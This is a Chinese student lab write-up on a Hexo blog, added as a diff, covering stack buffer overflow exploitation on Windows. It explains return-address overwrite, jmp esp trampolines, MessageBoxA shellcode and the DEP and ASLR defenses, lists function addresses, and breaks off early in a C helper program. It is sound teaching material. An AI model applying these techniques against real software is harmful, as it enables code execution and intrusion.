@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html 
+	lang="zh-CN">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		
+<link rel="stylesheet" href="/css/layout.css">
+
+		
+		<title> 实训记录 -  Moyuan&#34;s website</title>
+		<!-- <link rel="stylesheet" href="https://unpkg.com/mdui@1.0.2/dist/css/mdui.min.css" /> -->
+		<!-- <script src="https://unpkg.com/mdui@1.0.2/dist/js/mdui.min.js"></script> -->
+		
+<link rel="stylesheet" href="/lib/mdui/mdui.min.css">
+
+		
+<script src="/lib/mdui/mdui.min.js"></script>
+
+		<!-- lazyload -->
+		
+<script src="/lib/lazysizes.js"></script>
+
+		<!-- smooth-scrolling -->
+		
+<script src="/lib/smooth-scrolling.js"></script>
+
+		<!-- highlight -->
+		
+<link rel="stylesheet" href="/lib/highlight/atom-one-dark.min.css">
+
+		
+<script src="/lib/highlight/highlight.min.js"></script>
+
+		<!-- 预置 kiraicon -->
+		
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css">
+
+		
+		<link
+			rel="shortcut icon"
+			href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png"
+			type="image/png"
+		/>
+		
+<link rel="stylesheet" href="/deps/css/APlayer.min.css">
+
+		
+			
+				
+<link rel="stylesheet" href="/style.css">
+
+			
+				
+<link rel="stylesheet" href="/custom.css">
+
+			
+		
+		
+<script src="/deps/js/APlayer.min.js"></script>
+<script src="/deps/js/Meting.min.js"></script>
+
+	<meta name="generator" content="Hexo 6.3.0"></head>
+
+	<body>
+		<div
+			class="kira-background"
+			style="background-image: url('https://raw.githubusercontent.com/moyuan10086/photo/main/blackground.jpg')"
+		></div>
+		<div class="kira-header">
+    <a
+        class="kira-drawer-button mdui-ripple"
+        title="导航栏"
+        onclick="document.querySelector('.kira-sidebar-modal').classList.add('show');document.querySelector('.kira-sidebar#sidebar').classList.add('show');"
+    >
+        <i class="kirafont icon-menu"></i>
+    </a>
+    <a href="/" title="Moyuan&#34;s website">
+        <img
+			src="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png"
+			alt="moyuan"
+		/>
+    </a>
+</div>
+		<div class="kira-body">
+			<div class="kira-sidebar" id="sidebar">
+	<div class="kira-avatar mdui-ripple">
+		<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png" title="moyuan">
+			<img
+				src="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png"
+				alt="moyuan"
+			/>
+		</a>
+	</div>
+	<div class="kira-count">
+		<div><span>文章</span>2</div>
+		<div><span>标签</span>1</div>
+		<div><span>分类</span>1</div>
+	</div>
+	<div class="kira-list">
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/"
+			title="回到首页"
+		>
+			<i
+				class="kirafont
+					
+						icon-home
+					"
+			></i>
+			<div class="kira-list-item-content">
+				回到首页
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/archive.html"
+			title="文章归档"
+		>
+			<i
+				class="kirafont
+					
+						icon-container
+					"
+			></i>
+			<div class="kira-list-item-content">
+				文章归档
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/about.html"
+			title="关于本人"
+		>
+			<i
+				class="kirafont
+					
+						icon-user
+					"
+			></i>
+			<div class="kira-list-item-content">
+				关于本人
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/friends.html"
+			title="我的朋友"
+		>
+			<i
+				class="kirafont
+					
+						icon-team
+					"
+			></i>
+			<div class="kira-list-item-content">
+				我的朋友
+			</div>
+		</a>
+		
+	</div>
+	<aside id="kira-sidebar">
+		
+			<div class="kira-widget-wrap">
+	<div class="kira-widget kira-social">
+		
+			<a
+				class="mdui-ripple"
+				href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=2572045628&website=www.oicqzone.com"
+				target="_blank"
+				mdui-tooltip="{content: 'QQ'}"
+				style="color: rgb(49, 174, 255); background-color: rgba(49, 174, 255, .1);"
+			>
+				<i
+					class="kirafont
+					
+						icon-QQ
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://space.bilibili.com/476080649"
+				target="_blank"
+				mdui-tooltip="{content: '哔哩哔哩'}"
+				style="color: rgb(231, 106, 141); background-color: rgba(231, 106, 141, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-bilibili
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://github.com/moyuan10086"
+				target="_blank"
+				mdui-tooltip="{content: 'GitHub'}"
+				style="color: rgb(25, 23, 23); background-color: rgba(25, 23, 23, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-github
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://gitee.com/a25720"
+				target="_blank"
+				mdui-tooltip="{content: 'Gitee'}"
+				style="color: rgb(165, 15, 15); background-color: rgba(165, 15, 15, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-gitee
+					"
+				></i>
+			</a>
+		
+	</div>
+</div>
+
+		
+			
+  <div class="kira-widget-wrap">
+    <h3 class="kira-widget-title">分类</h3>
+    <div class="kira-widget">
+      <ul class="category-list">
+        
+        
+
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/CTF/">
+              CTF
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+		
+			
+	<div class="kira-widget-wrap">
+		<div id="randomtagcloud" class="kira-widget tagcloud kira-rainbow">
+			<a href="/tags/%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">溢出</a>
+		</div>
+		
+	</div>
+
+
+		
+	</aside>
+	<div class="kira-copyright">
+		&copy; 2024
+		<a href="/">moyuan</a>
+		Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> &
+		<a href="https://github.com/ch1ny/kira-hexo/" target="_blank">Kira-Hexo</a>
+		<br />
+		
+		我是 墨鸢（作为一名网络安全工程师来说要有一个虚拟名字，来保护自己的隐私性(～￣▽￣)～）
+	</div>
+</div>
+<div
+	class="kira-sidebar-modal"
+	id="sidebar-modal"
+	onclick="(function(self) {
+		self.classList.remove('show');
+		document.querySelector('.kira-sidebar.show#sidebar').classList.remove('show');
+	})(this)"
+></div>
+			<div class="kira-content">
+				<div id="kira-top-header"></div>
+				<div class="kira-main-content">
+					
+<link rel="stylesheet" href="/css/kira-image.css">
+
+
+<script src="/js/kira-image.js"></script>
+
+<div class="kira-image">
+    <div class="kira-image-modal">
+        <div class="kira-image-header">
+            <div class="kira-image-counter"></div>
+            <div class="kira-image-title"></div>
+            <div class="kira-image-operation">
+                <div class="kira-image-operation-button" id="kira-image-operation-button-zoom">
+                    <i class="kirafont icon-zoom-in"></i>
+                </div>
+                <div class="kira-image-operation-button" id="kira-image-operation-button-close">
+                    <i class="kirafont icon-close"></i>
+                </div>
+            </div>
+        </div>
+        <div class="kira-image-container">
+            <div class="kira-image-prev-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-left"></i>
+                </div>
+            </div>
+            <div class="kira-image-list">
+                <div class="kira-image-prev">
+                    <img />
+                </div>
+                <div class="kira-image-now">
+                    <img />
+                </div>
+                <div class="kira-image-next">
+                    <img />
+                </div>
+            </div>
+            <div class="kira-image-next-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-right"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+	
+<link rel="stylesheet" href="/css/kira-code-copy.css">
+
+	
+<script src="/js/kira-code-copy.js"></script>
+
+
+<div class="kira-post">
+	<article>
+		
+		<div class="kira-post-cover">
+			<img
+				data-src="https://raw.githubusercontent.com/moyuan10086/photo/main/Networksecurity.jpg"
+				data-sizes="auto"
+				alt="实训记录"
+				class="lazyload kira-post-cover-image disabled-kira-image"
+			/>
+			<h1>实训记录</h1>
+		</div>
+		
+		<div class="kira-post-meta kira-rainbow" style="margin:10px 0!important;">
+			<a><i class="kirafont icon-calendar-fill"></i>2024年02月01日</a>
+			<a><i class="kirafont icon-edit-fill"></i>11.6k 字</a>
+			<a><i class="kirafont icon-time-circle-fill"></i>大概 55 分钟</a>
+		</div>
+		<h2><span id="实训1-项目名称-缓冲区溢出利用">实训1 项目名称：   缓冲区溢出利用</span></h2><h3><span id="一-环境及工具">一、环境及工具</span></h3><h4><span id="基本信息">基本信息</span></h4><ul>
+<li>实验环境：Windows操作系统，使用Dev-C++ 5.11进行编译</li>
+<li>设备：个人计算机</li>
+<li>前置知识：C/C++编程基础，汇编语言基础，操作系统原理，网络安全基础</li>
+<li>必要的课程：计算机安全，网络安全</li>
+<li>说明：本实验旨在通过实践操作，深入理解缓冲区溢出的原理和利用方法，掌握编写和执行shellcode的基本技能。</li>
+<li>推荐的文章链接：(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/15952483.html">缓冲区溢出漏洞的原理及其利用实战 - 浅易深 - 博客园 (cnblogs.com)</a>)</li>
+</ul>
+<h4><span id="前置知识">前置知识</span></h4><ul>
+<li><p><strong>C/C++编程基础</strong>：理解数组、指针、字符串处理函数（如strcpy）的使用，以及函数调用过程中栈帧的变化。</p>
+</li>
+<li><p><strong>操作系统原理</strong>：了解进程和线程的基本概念，以及内存管理中的堆、栈、代码区和数据区。</p>
+</li>
+<li><p><strong>汇编语言基础</strong>：能够阅读和理解简单的汇编代码，了解寄存器的作用和常见的汇编指令。</p>
+</li>
+<li><p><strong>调试工具的使用</strong>：熟悉使用OllyDbg、IDA Pro等调试工具来分析程序的执行过程和内存布局。</p>
+</li>
+<li><p><strong>安全编程概念</strong>：了解缓冲区溢出漏洞的成因，以及如何通过安全编程实践来预防这类漏洞。</p>
+</li>
+<li><p><strong>Windows API函数</strong>：对于Windows平台，需要了解如何使用MessageBoxA、ExitProcess等API函数。</p>
+</li>
+<li><p><strong>Shellcode编写</strong>：理解如何编写简单的shellcode来执行特定的系统调用，如弹出对话框。</p>
+</li>
+<li><p><strong>动态链接库（DLL）和函数地址获取</strong>：了解如何在程序中加载DLL并获取特定函数的地址。</p>
+</li>
+<li><p><strong>操作系统保护机制</strong>：了解现代操作系统中用于防御缓冲区溢出的机制，如数据执行保护（DEP）和地址空间布局随机化（ASLR）。</p>
+</li>
+<li><p>Linux，x86体系结构，x86汇编，C语言，gdb</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/supplements/PC-Assembly-Language.pdf">PC Assembly Language</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/supplements/gcc-x86-Assembly.pdf">gcc x86 Assembly Quick Reference</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/supplements/gdb-refcard.pdf">GDB Quick Reference</a></p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><strong>缓冲区溢出（buffer overflow）</strong>：在计算机安全和程序设计中的一种异常，当一个程序向缓冲区写入数据时，超出了缓冲区边界并且覆盖了相邻内存。</li>
+<li><p><strong>调用栈（call stack）</strong>：用于存储程序中运行子例程信息的栈数据结构，先入后出。</p>
+</li>
+<li><p><strong>栈缓冲区溢出（stack buffer overflow）</strong>：程序向调用栈中原本缓冲区之外的内存地址写入数据，意图获取对指令指针的控制，将其指向恶意代码。</p>
+</li>
+</ul>
+<h4><span id="准备工作">准备工作</span></h4><ol>
+<li><strong>环境搭建</strong>：确保操作系统和编译器已正确安装，调试工具OllyDbg和IDA Pro已配置好。</li>
+<li><strong>知识复习</strong>：回顾C/C++编程基础，特别是数组和指针的使用，以及操作系统中堆栈的工作原理。</li>
+<li><strong>实验目的</strong>：明确实验的目标是理解和掌握缓冲区溢出攻击的原理和方法。</li>
+<li><strong>实验内容</strong>：详细阅读实验指导书，了解实验步骤和预期结果。</li>
+<li><strong>参考资料</strong>：查阅相关文献和网络资源，如<a target="_blank" rel="noopener" href="https://www.sojson.com/ascii.html">缓冲区溢出利用实验遇到的几个问题</a>，为实验提供理论支持。</li>
+</ol>
+<h4><span id="实验原理">实验原理</span></h4><p>缓冲区溢出是一种常见的软件安全漏洞，它发生在程序处理输入数据时，没有正确检查数据的长度，导致数据超出了分配给该数据的内存空间，从而覆盖了相邻的内存区域。这种溢出可以破坏程序的正常执行流程，甚至允许攻击者执行任意代码。在实验中，我们将通过编写一个存在缓冲区溢出漏洞的程序，然后利用这个漏洞来执行我们控制的代码，例如弹出一个警告对话框。</p>
+<p>缓冲区溢出漏洞的实验原理基于程序在处理输入数据时的缺陷。在C/C++程序中，如果使用如strcpy这样的函数来复制字符串到一个固定大小的缓冲区，而没有检查字符串的长度，那么当输入的字符串超过缓冲区的大小时，多余的数据就会溢出到相邻的内存区域。这个相邻的内存区域可能包含程序的返回地址，如果攻击者能够控制这个返回地址，就可以让程序执行攻击者指定的代码，这就是所谓的“控制流劫持”。</p>
+<p>在实验中，我们会创建一个简单的程序，该程序包含一个易受攻击的函数，该函数会接收用户输入并将其复制到一个固定大小的缓冲区。然后，我们会构造一个特殊的输入字符串，使其长度超过缓冲区的大小，从而触发溢出。通过精心构造这个字符串，我们可以覆盖返回地址，使其指向我们准备的shellcode。当程序执行到返回指令时，它会跳转到shellcode的地址，执行我们注入的代码。</p>
+<p>通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，进而运行精心准备的指令，以达到攻击的目的。  </p>
+<p><img src="https://pic3.zhimg.com/v2-1b6a999604597d4bdc536eb59c2955aa_b.jpg" alt></p>
+<p>如上图，程序的缓冲区比作一个个格子（内存单元），每个格子中存放不同的东西，有的是命令，有的是数据，当程序需要接收用户数据，程序预先为之分配了4个格子（上图中黄色的0~3号格子）。</p>
+<p>按照程序设计，就是要求用户输入的数据不超过4个。</p>
+<p>而用户在输入数据时，假设输入了16个数据，而且程序也没有对用户输入数据的多少进行检查（这种情况太常见了，windows系统本身就出过n个缓冲区溢出漏洞），就往预先分配的格子中存放，这样不仅4个分配的格子(内存)被使用了，其后相邻的12个格子中的内容都被新数据覆盖。  </p>
+<p>一般情况下后面的格子是可以被当成代码执行的，嘿嘿，那么好玩的事情来了，我们可以精心制造一段指令，比如格式化硬盘指令来让cpu执行。</p>
+<p><img src="https://pic4.zhimg.com/v2-48df59365aad345eb680d0da0cc56ab3_b.jpg" alt></p>
+<p>堆栈溢出是如何形成的？</p>
+<p>简单来说，堆栈溢出就是把大缓冲区中的数据向小缓冲区中复制，由于没有关注小缓冲区的边界，“撑爆”了较小的缓冲区，从而冲掉了小缓冲区和邻内区域的其他数据而引起的内存问题。在具体描述堆栈溢出之前我们先来了解一下 Linux 程序在内存中的结构：</p>
+<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/ae79ff8733b58380a78d8db1ff1c610d68380b0d77a9b6ad2591635514a85fa0/687474703a2f2f6d6d62697a2e717069632e636e2f6d6d62697a5f706e672f573944714b67467363363851674637706759475848647a6e33574468736730317a70316b6962335a384c6d55686d7951534a556f45717742556a376e61465a3971764c6268724c6e4a6d54384776416144366461716963412f303f77785f666d743d706e67"><img data-fancybox="gallery" data-sizes="auto" data-src="https://camo.githubusercontent.com/ae79ff8733b58380a78d8db1ff1c610d68380b0d77a9b6ad2591635514a85fa0/687474703a2f2f6d6d62697a2e717069632e636e2f6d6d62697a5f706e672f573944714b67467363363851674637706759475848647a6e33574468736730317a70316b6962335a384c6d55686d7951534a556f45717742556a376e61465a3971764c6268724c6e4a6d54384776416144366461716963412f303f77785f666d743d706e67" alt="img" class="lazyload"></a></p>
+<p>其中共享区也称为 data 区，用来存储可执行代码；.text 和 .bss 均用来存储程序的全局变量和初始化变量；堆则不随函数消亡而消亡，而是直到程序消亡或手动释放才会消亡；堆栈是随着函数分配并消亡的，堆栈溢出就是出现在堆栈区中的缓冲区安全问题。 </p>
+<p>堆栈是一个后进先出（LIFO）数据结构，往低地址增长，它保存本地变量、函数调用等信息。随着函数调用层数的增加，栈帧会向低地址方向延伸；随着进程中函数调用层数的减少，即各函数的返回，栈帧会一块一块地被遗弃而向内存的高地址方向回缩。各函数的栈帧大小随着函数的性质不同而不等。 </p>
+<p>堆栈这种数据结构，常见操作有压栈（PUSH）、弹栈（POP）；用于标识栈的属性有：栈顶（TOP）、栈底（BASE）。 </p>
+<p>其中：</p>
+<p>◈ PUSH：为栈增加一个元素的操作叫做 PUSH，相当于插入一块；</p>
+<p>◈ POP：从栈中取出一个元素的操作叫做 POP；</p>
+<p>◈ TOP：TOP 标识栈顶的位置，且是动态变化的，每做一次 PUSH 操作，它会自 +1；每做一次 POP 操作，它会自 -1；</p>
+<p>◈ BASE：BASE 标识栈底位置，用于防止栈空后继续弹栈，一般来说BASE位置不发生改变。</p>
+<p>下面以 main 函数叠加 A 和 B 函数为例说明整个压栈和弹栈过程：</p>
+<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/f0fe40ae66ac2079c75a56c3cf3b854f7ccb560f47e5547108dd495b061b0658/687474703a2f2f6d6d62697a2e717069632e636e2f6d6d62697a5f6a70672f573944714b67467363363851674637706759475848647a6e33574468736730317a696343413356447a3036755545396463517469616748725359506a6254384e587a39394f696336427a5155644b476632354c7a6e53766f772f303f77785f666d743d6a706567"><img data-fancybox="gallery" data-sizes="auto" data-src="https://camo.githubusercontent.com/f0fe40ae66ac2079c75a56c3cf3b854f7ccb560f47e5547108dd495b061b0658/687474703a2f2f6d6d62697a2e717069632e636e2f6d6d62697a5f6a70672f573944714b67467363363851674637706759475848647a6e33574468736730317a696343413356447a3036755545396463517469616748725359506a6254384e587a39394f696336427a5155644b476632354c7a6e53766f772f303f77785f666d743d6a706567" alt="img" class="lazyload"></a></p>
+<p>Main 函数调用 A 函数，把 A 函数中的变量添加到堆栈区内，开辟大小和变量指定大小相关。同样 B 函数在被调用后也会把变量添加到堆栈区内，开辟指定大小空间给 B 区域变量使用。</p>
+<p>◈如果其中任意一个变量存入的值超过设计的界定，就会导致值覆盖其他变量的区域最终污染到函数返回地址区域。一旦函数的返回地址被污染，在进行弹栈的过程中会最终把跳转的地址指向黑客所指定的区域，或根本不存在的区域。</p>
+<p>◈如果覆盖函数返回地址的是一组随机值，则程序会跳转到未知位置，这种情况往往最终会导致整个程序崩溃。</p>
+<p>◈如果黑客构造足够精细的 shellcode，把跳转地址指向黑客自己注入的代码，则很可能会利用该漏洞获得当前用户的控制权限。</p>
+<h4><span id="实验概述">实验概述</span></h4><ul>
+<li><strong>实验目的</strong>：通过模拟缓冲区溢出攻击，理解其原理，掌握利用方法。</li>
+<li><strong>实验要求</strong>：编写程序实现缓冲区溢出，执行特定功能（如弹出MessageBox警告框）。</li>
+<li><strong>实验原理</strong>：利用程序在处理输入时未正确检查缓冲区大小，导致数据溢出到相邻内存区域，覆盖关键数据（如返回地址），从而控制程序流程。</li>
+</ul>
+<h4><span id="实验中可能出现的问题">实验中可能出现的问题</span></h4><ol>
+<li><p><strong>编译器优化</strong>：某些编译器可能会对代码进行优化，这可能会改变程序的内存布局，使得溢出攻击更加困难。例如，编译器可能会将局部变量移动到堆上，或者在编译时自动插入安全检查。</p>
+</li>
+<li><p><strong>栈保护机制</strong>：现代操作系统和编译器可能会启用栈保护机制，如StackGuard或ProPolice，这些机制会检测并阻止栈溢出。</p>
+</li>
+<li><p><strong>地址随机化</strong>：地址空间布局随机化（ASLR）会随机化程序和库在内存中的位置，使得预测shellcode的执行地址变得困难。</p>
+</li>
+<li><p><strong>数据执行保护</strong>：数据执行保护（DEP）会标记某些内存区域为不可执行，阻止攻击者执行注入的代码。</p>
+</li>
+<li><p><strong>调试器干扰</strong>：在调试过程中，调试器可能会改变程序的执行行为，例如通过断点或单步执行，这可能会影响溢出攻击的成功率。</p>
+</li>
+<li><p><strong>shellcode兼容性</strong>：编写的shellcode需要与目标系统的架构（如x86或x64）兼容，并且需要考虑到目标系统上的特定API函数地址。</p>
+</li>
+<li><p><strong>错误处理</strong>：程序可能会有错误处理逻辑，如异常处理，这可能会在溢出发生时执行，从而影响攻击的执行流程。</p>
+</li>
+<li><p><strong>环境差异</strong>：不同的操作系统版本、编译器版本和系统配置可能会导致实验结果不一致。</p>
+</li>
+</ol>
+<p>为了成功完成实验，实验者需要对上述问题有所了解，并在实验设计中考虑到这些潜在的障碍。通过实验，实验者将能够更深入地理解缓冲区溢出的原理，并学会如何识别和利用这类漏洞。</p>
+<h3><span id="二-实训流程及分析">二、实训流程及分析</span></h3><p><strong>关键步骤</strong></p>
+<ol>
+<li><strong>精确定位返回地址的位置</strong>：通过调试工具分析程序执行过程中的堆栈变化，确定函数返回地址在堆栈中的具体位置。</li>
+<li><strong>寻找合适的地址覆盖原始地址</strong>：使用动态链接库（如user32.dll）中的跳转指令（如jmp esp）来找到一个合适的地址，以便将控制流引导到我们的shellcode。</li>
+<li><strong>编写shellcode到相应的缓冲区中</strong>：编写shellcode并将其放置在合适的内存位置，以便在覆盖后的地址执行。</li>
+</ol>
+<p>特别说明：在本实训中，我们将攻击代码（即MessageBox弹窗警告）直接写在jmp esp或call esp地址后面。这是因为jmp esp指令会跳转到栈指针（ESP）指向的地址执行代码，而我们的shellcode正好位于这个位置。这种方法可以确保在栈溢出时，执行流被重定向到我们控制的代码区域。</p>
+<p><strong>精确定位返回地址</strong></p>
+<ol>
+<li><p><strong>编译模式对比</strong>：首先，我们对比了不同编译模式下的栈空间分配。在debug模式下，编译器会为数组预留更多的空间，这可能会影响返回地址的定位。通过使用OllyDbg，我们观察了不同编译模式下返回地址的位置，以确保我们能够准确定位到目标地址。</p>
+</li>
+<li><p><strong>调试程序源码分析</strong>：我们编写了一个简单的调试程序，使用32bit-debug模式编译。通过观察程序执行后返回地址的内容，我们确定了返回地址的确切位置。</p>
+</li>
+<li><p><strong>ESP和EBP的入栈</strong>：在程序执行过程中，我们观察到ESP和EBP的值会入栈。这为我们提供了一个参考点，以便在后续步骤中确定正确的地址。</p>
+</li>
+</ol>
+<p><strong>寻找合适的跳转地址</strong></p>
+<ol>
+<li><p><strong>jmp esp(call esp)的利用</strong>：我们利用了jmp esp(call esp)指令的特性，这种指令允许程序跳转到ESP寄存器指向的地址。通过搜索kernel32.dll，我们找到了一些call esp的地址，这些地址可以被用来实现跳转。</p>
+</li>
+<li><p><strong>user32.dll的加载</strong>：由于MessageBoxA函数需要user32.dll动态链接库，我们必须确保主程序加载了这个库。否则，MessageBoxA调用将失败。</p>
+</li>
+</ol>
+<p><strong>编写shellcode并执行</strong></p>
+<ol>
+<li><p><strong>shellcode编写</strong>：我们编写了一个简单的shellcode，其目的是调用MessageBoxA函数来弹出警告框。这个shellcode需要被放置在程序的缓冲区中，以便在溢出时执行。</p>
+</li>
+<li><p><strong>攻击代码的放置</strong>：我们将shellcode直接写在jmp esp或者call esp地址后面，这样做的原因是，一旦jmp esp或call esp指令被执行，程序的控制流将跳转到ESP寄存器指向的地址，即我们的shellcode。这样，我们就可以控制程序执行我们想要的代码，而不是返回到原始的返回地址。</p>
+</li>
+<li><p><strong>程序执行</strong>：在程序执行过程中，我们通过溢出输入，覆盖了返回地址，使其指向我们的shellcode。当程序执行到返回指令时，它将跳转到shellcode，执行我们定义的操作（弹出MessageBoxA）。</p>
+</li>
+</ol>
+<p><strong>遇到的问题</strong></p>
+<ol>
+<li><p><strong>编译器的嵌套堆栈保护</strong>：在某些编译器版本中，如Dev-C++ 5.11，存在嵌套堆栈的保护机制。这会使得溢出后无法直接返回到我们想要的地址。为了解决这个问题，我们采用了几种方法：预留出足够的空间来覆盖嵌套堆栈，直接在动态调试器中修改汇编指令，或者更换编译器版本。</p>
+</li>
+<li><p><strong>调试器报错</strong>：在使用Dev-C++ 5.11编译时，我们在“__try”处遇到了报错。这提示我们需要更换编译器，或者使用其他等价的函数来避免错误。</p>
+</li>
+<li><p><strong>动态链接库的加载问题</strong>：在未正确加载user32.dll的情况下，MessageBoxA调用会失败。这要求我们在编写shellcode之前确保所有必要的动态链接库都被正确加载。</p>
+</li>
+</ol>
+<p>通过这些步骤和对问题的解决，我们成功地实现了缓冲区溢出攻击，并且弹出了MessageBoxA警告框。这个过程不仅加深了我们对缓冲区溢出原理的理解，也提高了我们在实际环境中识别和利用此类漏洞的能力。</p>
+<p><strong>具体操作</strong></p>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141647865.png" class title="image-20240131141647865">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141659202.png" class title="image-20240131141659202">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141706938.png" class title="image-20240131141706938">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141713797.png" class title="image-20240131141713797">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141723487.png" class title="image-20240131141723487">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141733407.png" class title="image-20240131141733407">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141740142.png" class title="image-20240131141740142">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141752071.png" class title="image-20240131141752071">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141800874.png" class title="image-20240131141800874">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141808492.png" class title="image-20240131141808492">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141816283.png" class title="image-20240131141816283">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141825548.png" class title="image-20240131141825548">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141833223.png" class title="image-20240131141833223">
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141841368.png" class title="image-20240131141841368">
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">user32=<span class="hljs-number">0x763f0000</span><br>ExitProcess= <span class="hljs-number">0x764174d0</span>                                                                                 <br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141851414.png" class title="image-20240131141851414">
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">user32=<span class="hljs-number">0x75880000</span>                                                                                         MessageBoxA= <span class="hljs-number">0x758fa110</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141859074.png" class title="image-20240131141859074">
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	HINSTANCE hHandle = <span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-string">&quot;user32.dll&quot;</span>);<br>	<span class="hljs-keyword">if</span>(!hHandle)<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span 